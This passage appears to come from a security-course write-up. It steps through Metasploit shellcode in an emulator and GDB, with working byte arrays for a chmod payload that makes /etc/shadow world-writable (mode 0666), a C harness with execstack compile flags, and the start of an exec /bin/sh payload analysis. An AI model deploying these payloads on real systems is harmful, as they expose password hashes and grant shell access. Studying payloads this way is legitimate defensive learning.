[emu 0x0x559c695604f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x559c695604f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] 99                              cwd 
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417001
[emu 0x0x559c695604f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x559c695604f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] 6A0F                            push byte 0xf
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417003
[emu 0x0x559c695604f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x559c695604f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] 58                              pop eax
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417004
[emu 0x0x559c695604f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x559c695604f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] 52                              push edx
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417005
[emu 0x0x559c695604f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x559c695604f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] E8                              call 0x1
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417016
[emu 0x0x559c695604f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x559c695604f0 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] 5B                              pop ebx
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417017
[emu 0x0x559c695604f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x0041700a
[emu 0x0x559c695604f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] 68B6010000                      push dword 0x1b6
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x0041701c
[emu 0x0x559c695604f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x0041700a
[emu 0x0x559c695604f0 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] 59                              pop ecx
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x0041701d
[emu 0x0x559c695604f0 debug ] eax=0x0000000f  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x559c695604f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] CD80                            int 0x80
sys_chmod(2) ; as expected calls chmod
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x0041701f
[emu 0x0x559c695604f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x559c695604f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] 6A01                            push byte 0x1
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417021
[emu 0x0x559c695604f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x559c695604f0 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] 58                              pop eax
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417022
[emu 0x0x559c695604f0 debug ] eax=0x00000001  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x559c695604f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] CD80                            int 0x80
sys_exit(2) ; then exit
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417024
[emu 0x0x559c695604f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x559c695604f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
[emu 0x0x559c695604f0 debug ] 0000                            add [eax],al
cpu error error accessing 0x00000004 not mapped

stepcount 12
[emu 0x0x559c695604f0 debug ] cpu state    eip=0x00417026
[emu 0x0x559c695604f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x559c695604f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x559c695604f0 debug ] Flags: 
ERROR  chmod (
) =  -1;
ERROR  exit (
     int status = 4288522;
) =  -1;
root@kali:~# 
```

Let's create a skeleton program:

```
// Filename: shellcode2.c
// Author:  SLAE-935
//
// Shellcode: msfvenom -p linux/x86/chmod --arch x86 --platform linux -f c

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";
void main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

// Compile with:
// gcc -fno-stack-protector -z execstack shellcode2.c -o shellcode2
```

And compile it:

```
$ gcc -fno-stack-protector -z execstack shellcode2.c -o shellcode2
```

Full GDB dump with comments:

```
$ gdb -q shellcode2
Reading symbols from /slae_code/Assignment 5/shellcode2...(no debugging symbols found)...done.
gdb-peda$ info variables 
All defined variables:

Non-debugging symbols:
0x08048508  _fp_hw
0x0804850c  _IO_stdin_used
0x08048620  __FRAME_END__
0x08049f14  __CTOR_LIST__
0x08049f14  __init_array_end
0x08049f14  __init_array_start
0x08049f18  __CTOR_END__
0x08049f1c  __DTOR_LIST__
0x08049f20  __DTOR_END__
0x08049f24  __JCR_END__
0x08049f24  __JCR_LIST__
0x08049f28  _DYNAMIC
0x08049ff4  _GLOBAL_OFFSET_TABLE_
0x0804a020  __data_start
0x0804a020  data_start
0x0804a024  __dso_handle
0x0804a040  code ; this is the variable where to set breakpoint
0x0804a068  completed.6159
0x0804a06c  dtor_idx.6161
gdb-peda$ b *0x0804a040 ; set breakpoint at the 'code' variable
Breakpoint 1 at 0x804a040
gdb-peda$ r ; run the program that should stop at breakpoint1 at address 0x804a040
Shellcode Length:  7

[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0x580f6a99 
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a040 --> 0x580f6a99
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03a <__dso_handle+22>:	add    BYTE PTR [eax],al
   0x804a03c <__dso_handle+24>:	add    BYTE PTR [eax],al
   0x804a03e <__dso_handle+26>:	add    BYTE PTR [eax],al
=> 0x804a040 <code>:	cdq ; double operand in AL to EAX    
   0x804a041 <code+1>:	push   0xf
   0x804a043 <code+3>:	pop    eax
   0x804a044 <code+4>:	push   edx
   0x804a045 <code+5>:	call   0x804a056 <code+22>
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0x7 
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804a040 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0x580f6a99 
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a041 --> 0x52580f6a
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03c <__dso_handle+24>:	add    BYTE PTR [eax],al
   0x804a03e <__dso_handle+26>:	add    BYTE PTR [eax],al
   0x804a040 <code>:	cdq    
=> 0x804a041 <code+1>:	push   0xf ; push 0xf (sys_chmod) on the stack
   0x804a043 <code+3>:	pop    eax
   0x804a044 <code+4>:	push   edx
   0x804a045 <code+5>:	call   0x804a056 <code+22>
   0x804a04a <code+10>:	das
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0x7 
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a041 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0x580f6a99 
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0xf 
EIP: 0x804a043 --> 0xce85258
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03e <__dso_handle+26>:	add    BYTE PTR [eax],al
   0x804a040 <code>:	cdq    
   0x804a041 <code+1>:	push   0xf
=> 0x804a043 <code+3>:	pop    eax ; store 0xf (sys_chmod) in EAX
   0x804a044 <code+4>:	push   edx
   0x804a045 <code+5>:	call   0x804a056 <code+22>
   0x804a04a <code+10>:	das    
   0x804a04b <code+11>:	gs
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0xf 
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0x7 
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a043 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a044 --> 0xce852
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a040 <code>:	cdq    
   0x804a041 <code+1>:	push   0xf
   0x804a043 <code+3>:	pop    eax
=> 0x804a044 <code+4>:	push   edx ; starts building string /etc/shadow on stack
   0x804a045 <code+5>:	call   0x804a056 <code+22>
   0x804a04a <code+10>:	das    
   0x804a04b <code+11>:	gs
   0x804a04c <code+12>:	je     0x804a0b1
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0x7 
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a044 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0x0 
EIP: 0x804a045 --> 0xce8
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a041 <code+1>:	push   0xf
   0x804a043 <code+3>:	pop    eax
   0x804a044 <code+4>:	push   edx
=> 0x804a045 <code+5>:	call   0x804a056 <code+22> ; continue building string /etc/shadow on stack
   0x804a04a <code+10>:	das    
   0x804a04b <code+11>:	gs
   0x804a04c <code+12>:	je     0x804a0b1
   0x804a04e <code+14>:	das
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0x0 
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0x7 
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a045 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c4 --> 0x804a04a ("/etc/shadow")
EIP: 0x804a056 --> 0x1b6685b
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a051 <code+17>:	popa   
   0x804a052 <code+18>:	outs   dx,DWORD PTR fs:[esi]
   0x804a054 <code+20>:	ja     0x804a056 <code+22>
=> 0x804a056 <code+22>:	pop    ebx ; ptr string /etc/shadow
   0x804a057 <code+23>:	push   0x1b6
   0x804a05c <code+28>:	pop    ecx
   0x804a05d <code+29>:	int    0x80
   0x804a05f <code+31>:	push   0x1
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c4 --> 0x804a04a ("/etc/shadow")
0004| 0xbffff6c8 --> 0x0 
0008| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0012| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0016| 0xbffff6d4 --> 0x7 
0020| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0024| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0028| 0xbffff6e0 --> 0xffffffff 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a056 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0x804a04a ("/etc/shadow")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0x0 
EIP: 0x804a057 --> 0x1b668
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a052 <code+18>:	outs   dx,DWORD PTR fs:[esi]
   0x804a054 <code+20>:	ja     0x804a056 <code+22>
   0x804a056 <code+22>:	pop    ebx
=> 0x804a057 <code+23>:	push   0x1b6 ; push MODE 0666 on stack
   0x804a05c <code+28>:	pop    ecx
   0x804a05d <code+29>:	int    0x80
   0x804a05f <code+31>:	push   0x1
   0x804a061 <code+33>:	pop    eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0x0 
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0x7 
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a057 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0x804a04a ("/etc/shadow")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c4 --> 0x1b6 
EIP: 0x804a05c --> 0x6a80cd59
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a054 <code+20>:	ja     0x804a056 <code+22>
   0x804a056 <code+22>:	pop    ebx
   0x804a057 <code+23>:	push   0x1b6
=> 0x804a05c <code+28>:	pop    ecx ; store 0x1b6 (MODE 0666) in ECX
   0x804a05d <code+29>:	int    0x80
   0x804a05f <code+31>:	push   0x1
   0x804a061 <code+33>:	pop    eax
   0x804a062 <code+34>:	int    0x80
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c4 --> 0x1b6 
0004| 0xbffff6c8 --> 0x0 
0008| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0012| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0016| 0xbffff6d4 --> 0x7 
0020| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0024| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0028| 0xbffff6e0 --> 0xffffffff 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a05c in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0x804a04a ("/etc/shadow")
ECX: 0x1b6 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0x0 
EIP: 0x804a05d --> 0x16a80cd
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a056 <code+22>:	pop    ebx
   0x804a057 <code+23>:	push   0x1b6
   0x804a05c <code+28>:	pop    ecx
=> 0x804a05d <code+29>:	int    0x80 call sys_chmod with args etc/shadow and mode 666
   0x804a05f <code+31>:	push   0x1
   0x804a061 <code+33>:	pop    eax
   0x804a062 <code+34>:	int    0x80
   0x804a064 <code+36>:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0x0 
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0x7 
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a05d in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xffffffff 
EBX: 0x804a04a ("/etc/shadow")
ECX: 0x1b6 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0x0 
EIP: 0x804a05f --> 0xcd58016a
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a057 <code+23>:	push   0x1b6
   0x804a05c <code+28>:	pop    ecx
   0x804a05d <code+29>:	int    0x80
=> 0x804a05f <code+31>:	push   0x1 ; push 0x1 (sys_exit) on stack
   0x804a061 <code+33>:	pop    eax
   0x804a062 <code+34>:	int    0x80
   0x804a064 <code+36>:	add    BYTE PTR [eax],al
   0x804a066:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0x0 
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0x7 
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a05f in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xffffffff 
EBX: 0x804a04a ("/etc/shadow")
ECX: 0x1b6 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c4 --> 0x1 
EIP: 0x804a061 --> 0x80cd58
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a05c <code+28>:	pop    ecx
   0x804a05d <code+29>:	int    0x80
   0x804a05f <code+31>:	push   0x1
=> 0x804a061 <code+33>:	pop    eax ; store 0x1 (sys_exit) in EAX
   0x804a062 <code+34>:	int    0x80
   0x804a064 <code+36>:	add    BYTE PTR [eax],al
   0x804a066:	add    BYTE PTR [eax],al
   0x804a068 <completed.6159>:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c4 --> 0x1 
0004| 0xbffff6c8 --> 0x0 
0008| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0012| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0016| 0xbffff6d4 --> 0x7 
0020| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0024| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0028| 0xbffff6e0 --> 0xffffffff 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a061 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x804a04a ("/etc/shadow")
ECX: 0x1b6 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0x0 
EIP: 0x804a062 --> 0x80cd
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a05d <code+29>:	int    0x80
   0x804a05f <code+31>:	push   0x1
   0x804a061 <code+33>:	pop    eax
=> 0x804a062 <code+34>:	int    0x80 ; calls sys_exit(0)
   0x804a064 <code+36>:	add    BYTE PTR [eax],al
   0x804a066:	add    BYTE PTR [eax],al
   0x804a068 <completed.6159>:	add    BYTE PTR [eax],al
   0x804a06a:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0x0 
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0x7 
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a062 in code ()
gdb-peda$ s
[Inferior 1 (process 1352) exited with code 0112]
Warning: not running or target is remote
gdb-peda$ 
```

The shellcode first set up the registers to call the chmod function, pointing at the file /etc/shadow with permission setting of 666, then exit.

## Shellcode 3 Analysis

Shellcode Options:

```
root@0802ed4415ba:/# msfvenom -p linux/x86/exec --payload-options
Options for payload/linux/x86/exec:


       Name: Linux Execute Command
     Module: payload/linux/x86/exec
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    vlad902 <vlad902@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command


Advanced options for payload/linux/x86/exec:

    Name                Current Setting  Required  Description
    ----                ---------------  --------  -----------
    AppendExit          false            no        Append a stub that executes the exit(0) system call
    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
    VERBOSE             false            no        Enable detailed status messages
    WORKSPACE                            no        Specify the workspace for this module
Evasion options for payload/linux/x86/exec:

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
root@0802ed4415ba:/# 
```

Shellcode generation:

```
root@0802ed4415ba:/# msfvenom -p linux/x86/exec --arch x86 --platform linux -f c CMD=/bin/sh
No encoder or badchars specified, outputting raw payload
Payload size: 43 bytes
Final size of c file: 205 bytes
unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
root@0802ed4415ba:/# 
```

Shellcode opcodes:

```
$ echo -ne "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80"| ndisasm -u -
00000000  6A0B              push byte +0xb ; push 0xb (sys_execve) on the stack
00000002  58                pop eax ; store 0xb (sys_execve) in EAX
00000003  99                cdq ; double AL to EAX
00000004  52                push edx ; push null on the stack
00000005  66682D63          push word 0x632d ; push '-c' on the stack
